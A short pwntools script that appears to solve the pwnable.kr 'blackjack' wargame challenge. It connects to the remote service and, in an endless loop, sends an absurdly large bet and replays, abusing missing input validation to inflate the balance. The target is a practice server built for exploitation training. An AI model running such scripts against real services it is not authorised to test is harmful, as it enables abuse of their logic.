from pwn import *

#context.log_level = 'debug'
#endflag=""

p=remote("pwnable.kr",9009)

print(p.recvuntil(")"))

p.sendline("Y")
print(p.recvuntil(":"))

p.sendline("1")
print(p.recvuntil("$"))

while True:
    p.sendline("99999999999999999999999999999999999")
    print(p.recvuntil("."))

    p.sendline("s")
    print(p.recvuntil("No"))

    p.sendline("y")
    print(p.recvuntil(""))
